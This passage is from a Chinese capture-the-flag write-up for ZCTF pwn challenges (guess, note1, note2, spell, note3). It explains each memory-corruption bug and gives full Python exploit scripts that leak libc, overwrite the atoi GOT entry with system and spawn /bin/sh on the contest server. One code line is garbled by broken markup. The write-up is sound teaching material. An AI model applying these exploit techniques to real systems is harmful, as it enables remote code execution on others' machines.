<div class="line number16 index15 alt1"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python string">'a'</code> <code class="python keyword">*</code> <code class="python plain">length </code><code class="python keyword">+</code> <code class="python string">"\x00"</code></div>
<div class="line number17 index16 alt2"><code class="python comments">#io.gdb_hint()</code></div>
<div class="line number18 index17 alt1"><code class="python plain">io.writeline(payload)</code></div>
<div class="line number19 index18 alt2"><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">io.readuntil(</code><code class="python string">"\n"</code><code class="python plain">)</code></div>
<div class="line number20 index19 alt1"><code class="python functions">print</code> <code class="python plain">result</code></div>
<div class="line number21 index20 alt2"><code class="python comments">#io.close(0)</code></div>
<div class="line number22 index21 alt1"><code class="python keyword">if</code> <code class="python string">"len error"</code> <code class="python keyword">in</code> <code class="python plain">result:</code></div>
<div class="line number23 index22 alt2"><code class="python keyword">return</code> <code class="python color1">False</code></div>
<div class="line number24 index23 alt1"><code class="python keyword">return</code> <code class="python color1">True</code></div>
<div class="line number25 index24 alt2"><code class="python keyword">def</code> <code class="python plain">pwn(io):</code></div>
<div class="line number26 index25 alt1"><code class="python comments">#io.read_until("please guess the flag:\n")</code></div>
<div class="line number27 index26 alt2"><code class="python plain">io.readuntil(</code><code class="python string">"please guess the flag:\n"</code><code class="python plain">)</code></div>
<div class="line number28 index27 alt1"><code class="python comments">"""</code></div>
<div class="line number29 index28 alt2"><code class="python comments">[stack] : 0x7fffff422210 --&gt; 0x73736575672f2e (b'./guess')</code></div>
<div class="line number30 index29 alt1"><code class="python comments">!![stack] : 0x7fffff421278 --&gt; 0x7fffff422210 --&gt; 0x73736575672f2e (b'./guess')</code></div>
<div class="line number31 index30 alt2"><code class="python comments">[stack] : 0x7fffff422ff0 --&gt; 0x73736575672f2e (b'./guess')</code></div>
<div class="line number32 index31 alt1"><code class="python comments">!![stack] : 0x7fffff4215e0 --&gt; 0x7fffff422ff0 --&gt; 0x73736575672f2e (b'./guess')</code></div>
<div class="line number33 index32 alt2"><code class="python comments">[stack] : 0x7fffc0eb7bfa --&gt; 0x73736575672f6e (b'n/guess')</code></div>
<div class="line number34 index33 alt1"><code class="python comments">[stack] : 0x7fffc0eb7ff0 --&gt; 0x73736575672f2e (b'./guess')</code></div>
<div class="line number35 index34 alt2"><code class="python comments">!![stack] : 0x7fffc0eb6c48 --&gt; 0x7fffc0eb7ff0 --&gt; 0x73736575672f2e (b'./guess')</code></div>
<div class="line number36 index35 alt1"><code class="python comments">arg[0]: 0x7fffc0eb67c0 ('a' &lt;repeats 15 times&gt;...)</code></div>
<div class="line number37 index36 alt2"><code class="python comments">"""</code></div>
<div class="line number38 index37 alt1"><code class="python plain">flag_addr </code><code class="python keyword">=</code> <code class="python value">0x6010C0</code> <code class="python keyword">+</code> <code class="python value">5</code> <code class="python comments">#+ 3 + 6</code></div>
<div class="line number39 index38 alt2"><code class="python plain">length </code><code class="python keyword">=</code> <code class="python value">34</code></div>
<div class="line number40 index39 alt1"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python string">"ZCTF{"</code></div>
<div class="line number41 index40 alt2"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">payload.ljust(length, </code><code class="python string">'b'</code><code class="python plain">)</code></div>
<div class="line number42 index41 alt1"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python string">"\x00"</code></div>
<div class="line number43 index42 alt2"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">payload.ljust(</code><code class="python value">0x7fffff421278</code> <code class="python keyword">-</code> <code class="python value">0x7fffff421150</code><code class="python plain">, </code><code class="python string">'a'</code><code class="python plain">)</code></div>
<div class="line number44 index43 alt1"><code class="python comments">#payload = payload.ljust(0x100, 'a')</code></div>
<div class="line number45 index44 alt2"><code class="python plain">payload </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">p64(flag_addr)</code></div>
<div class="line number46 index45 alt1"><code class="python comments">#payload = 'a' * (0x7fffc0eb68e8 - 0x7fffc0eb67c0) + p64(flag_addr)</code></div>
<div class="line number47 index46 alt2"><code class="python functions">raw_input</code><code class="python plain">()</code></div>
<div class="line number48 index47 alt1"><code class="python comments">#io.gdb_hint()</code></div>
<div class="line number49 index48 alt2"><code class="python comments">#io.writeline(payload)</code></div>
<div class="line number50 index49 alt1"><code class="python comments">#payload = 'a' * 0x50</code></div>
<div class="line number51 index50 alt2"><code class="python plain">io.writeline(payload)</code></div>
<div class="line number52 index51 alt1"><code class="python comments">#io.interact()</code></div>
<div class="line number53 index52 alt2"><code class="python plain">io.interactive()</code></div>
<div class="line number54 index53 alt1"><code class="python comments">"""</code></div>
<div class="line number55 index54 alt2"><code class="python comments">#leak length = 9</code></div>
<div class="line number56 index55 alt1"><code class="python comments">for i in range(32, 256):</code></div>
<div class="line number57 index56 alt2"><code class="python comments">print i</code></div>
<div class="line number58 index57 alt1"><code class="python comments">io = get_io(target)</code></div>
<div class="line number59 index58 alt2"><code class="python comments">if leak_len(io, i) == True:</code></div>
<div class="line number60 index59 alt1"><code class="python comments">break</code></div>
<div class="line number61 index60 alt2"><code class="python comments">exit(0)</code></div>
<div class="line number62 index61 alt1"><code class="python comments">"""</code></div>
<div class="line number63 index62 alt2"><code class="python plain">io </code><code class="python keyword">=</code> <code class="python plain">get_io(target)</code></div>
<div class="line number64 index63 alt1"><code class="python plain">pwn(io)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>然后异或即可:</p>
<table class="syntaxhighlighter  python" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">a </code><code class="python keyword">=</code> <code class="python string">'0\x07\x03SSS;=\x0cQQ&amp;=\x16R=[\x17\x07\x111=\x04\x0e"\x05]\x1fh'</code></div>
<div class="line number2 index1 alt1"><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">[]</code></div>
<div class="line number3 index2 alt2"><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python plain">a:</code></div>
<div class="line number4 index3 alt1"><code class="python plain">result.append(</code><code class="python functions">chr</code><code class="python plain">(</code><code class="python functions">ord</code><code class="python plain">(i) ^ </code><code class="python functions">ord</code><code class="python plain">(</code><code class="python string">'b'</code><code class="python plain">)))</code></div>
<div class="line number5 index4 alt2"><code class="python functions">print</code> <code class="python plain">"".join(result)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>结果:</p>
<p><a href="http://p6.qhimg.com/t01faee85afff0348b2.png" target="_blank"><img title="t01faee85afff0348b2.png" src="http://p6.qhimg.com/t01faee85afff0348b2.png" alt="http://p6.qhimg.com/t01faee85afff0348b2.png" /></a></p>
<p>flag: ZCTF{Rea111Y_n33D_t0_9uesS_fl@g?}</p>
<p>&nbsp;</p>
<h2><span style="color: #ff6600;">note1(pwn200):</span></h2>
<p>这题比较简单,是个菜单式的交互程序,分析程序的结构体,得到如下:</p>
<p><a href="http://p6.qhimg.com/t01a64938b8c37030c6.png" target="_blank"><img title="t01a64938b8c37030c6.png" src="http://p6.qhimg.com/t01a64938b8c37030c6.png" alt="http://p6.qhimg.com/t01a64938b8c37030c6.png" /></a></p>
<p>可见content的长度为256,而在edit的时候,能够读入512字节,从而发送缓冲区覆盖,如下:</p>
<p><a href="http://p8.qhimg.com/t0185a916de114c976f.png" target="_blank"><img title="t0185a916de114c976f.png" src="http://p8.qhimg.com/t0185a916de114c976f.png" alt="http://p8.qhimg.com/t0185a916de114c976f.png" /></a></p>
<p>结构体中有指针,泄露和利用都比较容易,利用代码如下:</p>
<table class="syntaxhighlighter  python" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
<div class="line number18 index17 alt1">18</div>
<div class="line number19 index18 alt2">19</div>
<div class="line number20 index19 alt1">20</div>
<div class="line number21 index20 alt2">21</div>
<div class="line number22 index21 alt1">22</div>
<div class="line number23 index22 alt2">23</div>
<div class="line number24 index23 alt1">24</div>
<div class="line number25 index24 alt2">25</div>
<div class="line number26 index25 alt1">26</div>
<div class="line number27 index26 alt2">27</div>
<div class="line number28 index27 alt1">28</div>
<div class="line number29 index28 alt2">29</div>
<div class="line number30 index29 alt1">30</div>
<div class="line number31 index30 alt2">31</div>
<div class="line number32 index31 alt1">32</div>
<div class="line number33 index32 alt2">33</div>
<div class="line number34 index33 alt1">34</div>
<div class="line number35 index34 alt2">35</div>
<div class="line number36 index35 alt1">36</div>
<div class="line number37 index36 alt2">37</div>
<div class="line number38 index37 alt1">38</div>
<div class="line number39 index38 alt2">39</div>
<div class="line number40 index39 alt1">40</div>
<div class="line number41 index40 alt2">41</div>
<div class="line number42 index41 alt1">42</div>
<div class="line number43 index42 alt2">43</div>
<div class="line number44 index43 alt1">44</div>
<div class="line number45 index44 alt2">45</div>
<div class="line number46 index45 alt1">46</div>
<div class="line number47 index46 alt2">47</div>
<div class="line number48 index47 alt1">48</div>
<div class="line number49 index48 alt2">49</div>
<div class="line number50 index49 alt1">50</div>
<div class="line number51 index50 alt2">51</div>
<div class="line number52 index51 alt1">52</div>
<div class="line number53 index52 alt2">53</div>
<div class="line number54 index53 alt1">54</div>
<div class="line number55 index54 alt2">55</div>
<div class="line number56 index55 alt1">56</div>
<div class="line number57 index56 alt2">57</div>
<div class="line number58 index57 alt1">58</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">__author__ </code><code class="python keyword">=</code> <code class="python string">"pxx"</code></div>
<div class="line number2 index1 alt1"><code class="python keyword">from</code> <code class="python plain">zio </code><code class="python keyword">import</code> <code class="python keyword">*</code></div>
<div class="line number3 index2 alt2"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div>
<div class="line number4 index3 alt1"><code class="python comments">#target = "./note1"</code></div>
<div class="line number5 index4 alt2"><code class="python plain">target </code><code class="python keyword">=</code> <code class="python plain">(</code><code class="python string">"115.28.27.103"</code><code class="python plain">, </code><code class="python value">9001</code><code class="python plain">)</code></div>
<div class="line number6 index5 alt1"><code class="python keyword">def</code> <code class="python plain">get_io(target):</code></div>
<div class="line number7 index6 alt2"><code class="python plain">r_m </code><code class="python keyword">=</code> <code class="python plain">COLORED(RAW, </code><code class="python string">"green"</code><code class="python plain">)</code></div>
<div class="line number8 index7 alt1"><code class="python plain">w_m </code><code class="python keyword">=</code> <code class="python plain">COLORED(RAW, </code><code class="python string">"blue"</code><code class="python plain">)</code></div>
<div class="line number9 index8 alt2"><code class="python plain">io </code><code class="python keyword">=</code> <code class="python plain">zio(target, timeout </code><code class="python keyword">=</code> <code class="python value">9999</code><code class="python plain">, print_read </code><code class="python keyword">=</code> <code class="python plain">r_m, print_write </code><code class="python keyword">=</code> <code class="python plain">w_m)</code></div>
<div class="line number10 index9 alt1"><code class="python keyword">return</code>  <code class="python plain">io </code></div>
<div class="line number11 index10 alt2"><code class="python keyword">def</code> <code class="python plain">new_note(io, title_t, type_t, content_t):</code></div>
<div class="line number12 index11 alt1"><code class="python plain">io.read_until(</code><code class="python string">"option---&gt;&gt;\n"</code><code class="python plain">)</code></div>
<div class="line number13 index12 alt2"><code class="python plain">io.writeline(</code><code class="python string">"1"</code><code class="python plain">)</code></div>
<div class="line number14 index13 alt1"><code class="python plain">io.read_until(</code><code class="python string">"title:\n"</code><code class="python plain">)</code></div>
<div class="line number15 index14 alt2"><code class="python plain">io.writeline(title_t)</code></div>
<div class="line number16 index15 alt1"><code class="python plain">io.read_until(</code><code class="python string">"type:\n"</code><code class="python plain">)</code></div>
<div class="line number17 index16 alt2"><code class="python plain">io.writeline(type_t)</code></div>
<div class="line number18 index17 alt1"><code class="python plain">io.read_until(</code><code class="python string">"content:\n"</code><code class="python plain">)</code></div>
<div class="line number19 index18 alt2"><code class="python plain">io.writeline(content_t)</code></div>
<div class="line number20 index19 alt1"><code class="python keyword">def</code> <code class="python plain">show_note(io):</code></div>
<div class="line number21 index20 alt2"><code class="python plain">io.read_until(</code><code class="python string">"option---&gt;&gt;\n"</code><code class="python plain">)</code></div>
<div class="line number22 index21 alt1"><code class="python plain">io.writeline(</code><code class="python string">"2"</code><code class="python plain">)</code></div>
<div class="line number23 index22 alt2"><code class="python keyword">def</code> <code class="python plain">edit_note(io, title_t, content_t):</code></div>
<div class="line number24 index23 alt1"><code class="python plain">io.read_until(</code><code class="python string">"option---&gt;&gt;\n"</code><code class="python plain">)</code></div>
<div class="line number25 index24 alt2"><code class="python plain">io.writeline(</code><code class="python string">"3"</code><code class="python plain">)</code></div>
<div class="line number26 index25 alt1"><code class="python plain">io.read_until(</code><code class="python string">"title:\n"</code><code class="python plain">)</code></div>
<div class="line number27 index26 alt2"><code class="python plain">io.writeline(title_t)</code></div>
<div class="line number28 index27 alt1"><code class="python plain">io.read_until(</code><code class="python string">"content:\n"</code><code class="python plain">)</code></div>
<div class="line number29 index28 alt2"><code class="python plain">io.writeline(content_t)</code></div>
<div class="line number30 index29 alt1"><code class="python keyword">def</code> <code class="python plain">pwn(io):</code></div>
<div class="line number31 index30 alt2"><code class="python plain">new_note(io, </code><code class="python string">'aaa'</code><code class="python plain">, </code><code class="python string">'aaa'</code><code class="python plain">, </code><code class="python string">'aaa'</code><code class="python plain">)</code></div>
<div class="line number32 index31 alt1"><code class="python plain">new_note(io, </code><code class="python string">'bbb'</code><code class="python plain">, </code><code class="python string">'bbb'</code><code class="python plain">, </code><code class="python string">'bbb'</code><code class="python plain">)</code></div>
<div class="line number33 index32 alt2"><code class="python plain">new_note(io, </code><code class="python string">'ccc'</code><code class="python plain">, </code><code class="python string">'ccc'</code><code class="python plain">, </code><code class="python string">'ccc'</code><code class="python plain">)</code></div>
<div class="line number34 index33 alt1"><code class="python plain">show_note(io)</code></div>
<div class="line number35 index34 alt2"><code class="python plain">atoi_got </code><code class="python keyword">=</code> <code class="python value">0x0000000000602068</code> <code class="python keyword">-</code> <code class="python value">0x80</code></div>
<div class="line number36 index35 alt1"><code class="python plain">content</code><code class="python keyword">=</code> <code class="python string">'a'</code> <code class="python keyword">*</code> <code class="python value">256</code> <code class="python keyword">+</code> <code class="python plain">l64(</code><code class="python value">0x01</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">l64(</code><code class="python value">0x01</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">l64(</code><code class="python value">0x01</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">l64(atoi_got) </code><code class="python keyword">+</code> <code class="python string">"bbb"</code></div>
<div class="line number37 index36 alt2"><code class="python plain">io.gdb_hint()</code></div>
<div class="line number38 index37 alt1"><code class="python plain">edit_note(io, </code><code class="python string">'aaa'</code><code class="python plain">, content)</code></div>
<div class="line number39 index38 alt2"><code class="python plain">show_note(io)</code></div>
<div class="line number40 index39 alt1"><code class="python plain">io.read_until(</code><code class="python string">"title=, type=, content="</code><code class="python plain">)</code></div>
<div class="line number41 index40 alt2"><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">io.read_until(</code><code class="python string">"\n"</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">]</code></div>
<div class="line number42 index41 alt1">
<p><code class="python functions">print</code></p>
<p>[c 3="&lt;code" 4="4=&quot;4=&quot;4=&quot;4=&quot;class=&quot;python&quot;&quot;&quot;&quot;" 5="5=&quot;5=&quot;5=&quot;5=&quot;plain&quot;&gt;c&quot;&quot;&quot;&quot;" 6="&lt;/code&gt;&lt;code" 7="7=&quot;7=&quot;7=&quot;7=&quot;class=&quot;python&quot;&quot;&quot;&quot;" 8="8=&quot;8=&quot;8=&quot;8=&quot;keyword&quot;&gt;in&lt;/code&gt;&quot;&quot;&quot;&quot;" 9="&lt;code" 10="10=&quot;10=&quot;10=&quot;10=&quot;class=&quot;python&quot;&quot;&quot;&quot;" 11="11=&quot;11=&quot;11=&quot;11=&quot;plain&quot;&gt;data&quot;&quot;&quot;&quot;" language="&lt;/code&gt;&lt;code"][/c]</p>
</div>
<div class="line number43 index42 alt2"><code class="python plain">data </code><code class="python keyword">=</code> <code class="python plain">data.ljust(</code><code class="python value">8</code><code class="python plain">, </code><code class="python string">'\x00'</code><code class="python plain">)</code></div>
<div class="line number44 index43 alt1"><code class="python plain">malloc_addr </code><code class="python keyword">=</code> <code class="python plain">l64(data)</code></div>
<div class="line number45 index44 alt2"><code class="python keyword">print</code> <code class="python string">"malloc_addr:"</code><code class="python plain">, </code><code class="python functions">hex</code><code class="python plain">(malloc_addr)</code></div>
<div class="line number46 index45 alt1"><code class="python plain">elf_info </code><code class="python keyword">=</code> <code class="python plain">ELF(</code><code class="python string">"./libc-2.19.so"</code><code class="python plain">)</code></div>
<div class="line number47 index46 alt2"><code class="python plain">malloc_offset </code><code class="python keyword">=</code> <code class="python plain">elf_info.symbols[</code><code class="python string">"malloc"</code><code class="python plain">]</code></div>
<div class="line number48 index47 alt1"><code class="python plain">system_offset </code><code class="python keyword">=</code> <code class="python plain">elf_info.symbols[</code><code class="python string">"system"</code><code class="python plain">]</code></div>
<div class="line number49 index48 alt2"><code class="python plain">libc_base </code><code class="python keyword">=</code> <code class="python plain">malloc_addr </code><code class="python keyword">-</code> <code class="python plain">malloc_offset</code></div>
<div class="line number50 index49 alt1"><code class="python plain">system_addr </code><code class="python keyword">=</code> <code class="python plain">libc_base </code><code class="python keyword">+</code> <code class="python plain">system_offset</code></div>
<div class="line number51 index50 alt2"><code class="python plain">content </code><code class="python keyword">=</code> <code class="python string">"a"</code> <code class="python keyword">*</code> <code class="python value">16</code> <code class="python keyword">+</code> <code class="python plain">l64(system_addr)</code></div>
<div class="line number52 index51 alt1"><code class="python keyword">print</code> <code class="python string">"system_addr:"</code><code class="python plain">, </code><code class="python functions">hex</code><code class="python plain">(system_addr)</code></div>
<div class="line number53 index52 alt2"><code class="python plain">edit_note(io, "", content)</code></div>
<div class="line number54 index53 alt1"><code class="python plain">io.read_until(</code><code class="python string">"option---&gt;&gt;\n"</code><code class="python plain">)</code></div>
<div class="line number55 index54 alt2"><code class="python plain">io.writeline(</code><code class="python string">"/bin/sh"</code><code class="python plain">)</code></div>
<div class="line number56 index55 alt1"><code class="python plain">io.interact()</code></div>
<div class="line number57 index56 alt2"><code class="python plain">io </code><code class="python keyword">=</code> <code class="python plain">get_io(target)</code></div>
<div class="line number58 index57 alt1"><code class="python plain">pwn(io)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>结果:</p>
<p><a href="http://p3.qhimg.com/t017f00741ac2521de7.png" target="_blank"><img title="t017f00741ac2521de7.png" src="http://p3.qhimg.com/t017f00741ac2521de7.png" alt="http://p3.qhimg.com/t017f00741ac2521de7.png" /></a></p>
<p>flag: ZCTF{3n@B1e_Nx_IS_n0t_3norrugH!!}</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">note2(pwn400):</span></h3>
<p>这道题也是菜单式的形式,主要问题在于edit的时候,append可以越界,如下图:</p>
<p><a href="http://p8.qhimg.com/t01d546b6394e9c80de.png" target="_blank"><img title="t01d546b6394e9c80de.png" src="http://p8.qhimg.com/t01d546b6394e9c80de.png" alt="http://p8.qhimg.com/t01d546b6394e9c80de.png" /></a></p>
<p>如果size开始为0,那么size – strlen(dest) + 14 &lt;= 14 了,所以最后strncat的时候,可以无限附加,覆盖下个堆块,当size为0的时候,默认会分配的堆块大小为0x20,由于每个堆块的大小可以自己设 置大小,所以这里采用fastbin(堆块大小为0x20~0x80),由于可以覆盖后面的堆块,所以可以伪装假堆块在name中,然后对其进行free,再次申请的时候,就可以得到该地址,从而改写全局指针,如下:</p>
<p><a href="http://p2.qhimg.com/t01a501eb2ad6d62ca1.png" target="_blank"><img title="t01a501eb2ad6d62ca1.png" src="http://p2.qhimg.com/t01a501eb2ad6d62ca1.png" alt="http://p2.qhimg.com/t01a501eb2ad6d62ca1.png" /></a></p>
<p>最终利用代码如下:<br />
[code]<br />
_author__ = &quot;pxx&quot;<br />
from zio import *<br />
from pwn import *<br />
#ip = 1.192.225.129<br />
#target = &quot;./note2&quot;<br />
target = (&quot;115.28.27.103&quot;, 9002)<br />
def get_io(target):<br />
r_m = COLORED(RAW, &quot;green&quot;)<br />
w_m = COLORED(RAW, &quot;blue&quot;)<br />
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)<br />
return  io<br />
def new_note(io, length_t, content_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;1&quot;)<br />
io.read_until(&quot;content:(less than 128)\n&quot;)<br />
io.writeline(str(length_t))<br />
io.read_until(&quot;content:\n&quot;)<br />
io.writeline(content_t)<br />
def show_note(io, id_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;2&quot;)<br />
io.read_until(&quot;id of the note:\n&quot;)<br />
io.writeline(str(id_t))<br />
def delete_note(io, id_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;2&quot;)<br />
io.read_until(&quot;id of the note:\n&quot;)<br />
io.writeline(str(id_t))<br />
def edit_note(io, id_t, type_t, content_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;3&quot;)<br />
io.read_until(&quot;id of the note:\n&quot;)<br />
io.writeline(str(id_t))<br />
io.read_until(&quot;[1.overwrite/2.append]\n&quot;)<br />
io.writeline(str(type_t))<br />
io.read_until(&quot;Contents:&quot;)<br />
io.writeline(content_t)<br />
def pwn(io):<br />
name_addr = 0x6020E0<br />
address_addr = 0x602180<br />
address = 'aaa'<br />
name  = l64(0x20) + l64(0x21)<br />
name = name.ljust(0x20, 'a')<br />
name += l64(0x20) + l64(0x21)<br />
name += l64(0x0)<br />
io.read_until(&quot;Input your name:\n&quot;)<br />
io.writeline(name)<br />
io.read_until(&quot;Input your address:\n&quot;)<br />
io.writeline(address)<br />
new_note(io, 0, '')<br />
new_note(io, 0x80, '')<br />
atoi_got = 0x0000000000602088<br />
manage_addr = 0x602120<br />
payload = 'a' * 0x10<br />
for i in range(7):<br />
edit_note(io, 0, 2, payload)<br />
payload = 'a' * 0xf<br />
edit_note(io, 0, 2, payload)<br />
payload = 'a' + l64(name_addr + 0x10)<br />
edit_note(io, 0, 2, payload)<br />
io.gdb_hint()<br />
new_note(io, 0, '')<br />
payload = 'a' * 0x10<br />
for i in range(2):<br />
edit_note(io, 2, 2, payload)<br />
payload = 'a' * 0xf<br />
edit_note(io, 2, 2, payload)<br />
payload = 'a' + l64(atoi_got)<br />
edit_note(io, 2, 2, payload)<br />
show_note(io, 0)<br />
io.read_until('Content is ')<br />
data = io.read_until(&quot;\n&quot;)[:-1]<br />
print [c for c in data]<br />
data = data.ljust(8, '\x00')<br />
aoti_addr = l64(data)<br />
print &quot;aoti_addr:&quot;, hex(aoti_addr)<br />
elf_info = ELF(&quot;./libc-2.19.so&quot;)<br />
#elf_info = ELF(&quot;./libc.so.6&quot;)<br />
atoi_offset = elf_info.symbols[&quot;atoi&quot;]<br />
system_offset = elf_info.symbols[&quot;system&quot;]<br />
libc_base = aoti_addr - atoi_offset<br />
system_addr = libc_base + system_offset<br />
content = l64(system_addr)<br />
print &quot;system_addr:&quot;, hex(system_addr)<br />
edit_note(io, 0, 1, content)<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;/bin/sh&quot;)<br />
io.interact()<br />
io = get_io(target)<br />
pwn(io)<br />
[/code]<br />
结果</p>
<p><a href="http://p4.qhimg.com/t01c2c8e2bd426387c5.png" target="_blank"><img title="t01c2c8e2bd426387c5.png" src="http://p4.qhimg.com/t01c2c8e2bd426387c5.png" alt="http://p4.qhimg.com/t01c2c8e2bd426387c5.png" /></a></p>
<p>flag: ZCTF{C0ngr@tu1@tIoN_tewre0_PwN_8ug_19390#@!}</p>
<p>spell(pwn300):</p>
<p>这道题的逻辑还是比较简单的,读取用户数据,然后与从驱动中读到的数据进行对比,符合要求,则打印flag。</p>
<p>看驱动代码,发现有两个ioctl指令:</p>
<p>0x80086B01 –&gt; 返回8字节随机数</p>
<p>0x80086B02 –&gt; 返回时间字符串</p>
<p>如下:</p>
<p><a href="http://p8.qhimg.com/t01036926354079617b.png" target="_blank"><img title="t01036926354079617b.png" src="http://p8.qhimg.com/t01036926354079617b.png" alt="http://p8.qhimg.com/t01036926354079617b.png" /></a></p>
<p>而时间在最初的时候会打印一次,但是这里只是精确到分钟。</p>
<p>对于用户输入的串,与驱动进行比较时,会有多轮次,长度符合规律,现将长度求出得56,每8字节为一组,与驱动中读出的数据进行异或,如果每次异或结果都为’zctfflag’,则成功。</p>
<p>问题所在:</p>
<p>读取用户输入的时候,会读取len+2的长度,而且将len+1的位置置为’\n’,那么此时如果输入长度刚好为256,可以读取258个字节</p>
<p><a href="http://p1.qhimg.com/t011ec55df2181536c9.png" target="_blank"><img title="t011ec55df2181536c9.png" src="http://p1.qhimg.com/t011ec55df2181536c9.png" alt="http://p1.qhimg.com/t011ec55df2181536c9.png" /></a></p>
<p>而在cpy函数中,赋值结束时按照’\n’来定的,所以可以赋值257个字节,如下:</p>
<p><a href="http://p9.qhimg.com/t01d546b6394e9c80de.png" target="_blank"><img title="t01d546b6394e9c80de.png" src="http://p9.qhimg.com/t01d546b6394e9c80de.png" alt="http://p9.qhimg.com/t01d546b6394e9c80de.png" /></a></p>
<p>而dest_buff缓冲区只有256个字节,其后跟着v13,它为第二次获取驱动中数据函数ioctl的指令代码,如下:</p>
<p><a href="http://p8.qhimg.com/t01a501eb2ad6d62ca1.png" target="_blank"><img title="t01a501eb2ad6d62ca1.png" src="http://p8.qhimg.com/t01a501eb2ad6d62ca1.png" alt="http://p8.qhimg.com/t01a501eb2ad6d62ca1.png" /></a></p>
<p>所以可以覆盖其最低字节,那么此时如果将最后一字节其覆盖成0x02,则获取的结果就是8字节的时间,而时间是8字节的,而且是以分钟为精度的,所以可以将第一次的时间近似看成第二次的时间,从而构造合适的输入数据。</p>
<p>利用代码如下:<br />
[code]<br />
__author__ = &quot;pxx&quot;<br />
from zio import *<br />
target = (&quot;115.28.27.103&quot;, 33333)<br />
def get_io(target):<br />
r_m = COLORED(RAW, &quot;green&quot;)<br />
w_m = COLORED(RAW, &quot;blue&quot;)<br />
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)<br />
#io = process(target, timeout = 9999)<br />
return  io<br />
def pwn(io):<br />
io.read_until(&quot;How long of your spell:&quot;)<br />
io.writeline(&quot;256&quot;)<br />
io.read_until(&quot;At &quot;)<br />
time_info = io.read_until(&quot;: &quot;)<br />
io.read_until(&quot;you enter the spell: &quot;)<br />
time_info = time_info + &quot;\x00&quot;<br />
info = &quot;zctfflag&quot;<br />
result = []<br />
padding = &quot;&quot;<br />
for i in range(8):<br />
padding += chr(ord(time_info[i]) ^ ord(info[i]))<br />
payload = padding * 7<br />
payload += &quot;\x00&quot;<br />
payload = payload.ljust(256, 'a')<br />
payload += '\x02'<br />
io.writeline(payload)<br />
io.interact()<br />
io = get_io(target)<br />
pwn(io)<br />
[/code]</p>
<p>结果:</p>
<p><a href="http://p5.qhimg.com/t01b908d41ddd93ac54.png" target="_blank"><img title="t01b908d41ddd93ac54.png" src="http://p5.qhimg.com/t01b908d41ddd93ac54.png" alt="http://p5.qhimg.com/t01b908d41ddd93ac54.png" /></a></p>
<p>flag: ZCTF{SPELL_IS_IN_THE_D33wRIVER}</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">note3(pwn300):</span></h3>
<p>该题是note系列第三个,问题依然在edit中,如下图:</p>
<p><a href="http://p7.qhimg.com/t0195c703586bd6be83.png" target="_blank"><img title="t0195c703586bd6be83.png" src="http://p7.qhimg.com/t0195c703586bd6be83.png" alt="http://p7.qhimg.com/t0195c703586bd6be83.png" /></a></p>
<p>其中输入的id经过一些列运算,其中get_long函数中,转换是atol,而发行len&lt;0时,将len=-len,这里有个整数型溢出问题,因为0x8000000000000000 = -0x8000000000000000。</p>
<p><a href="http://p1.qhimg.com/t0103ab745139f1da87.png" target="_blank"><img title="t0103ab745139f1da87.png" src="http://p1.qhimg.com/t0103ab745139f1da87.png" alt="http://p1.qhimg.com/t0103ab745139f1da87.png" /></a></p>
<p>而0x8000000000000000的值为-1,所以可以导致索引为全局结构体数组中的前一个指针。其为当前的活跃指针,如下:</p>
<p><a href="http://p0.qhimg.com/t019378bcac8b09e9fd.png" target="_blank"><img title="t019378bcac8b09e9fd.png" src="http://p0.qhimg.com/t019378bcac8b09e9fd.png" alt="http://p0.qhimg.com/t019378bcac8b09e9fd.png" /></a></p>
<p>edit的时候:id_t为-1;其对应的长度不在是size,第七个堆块的指针所以可以读很长的内容,从而覆盖后面的堆块,如下:</p>
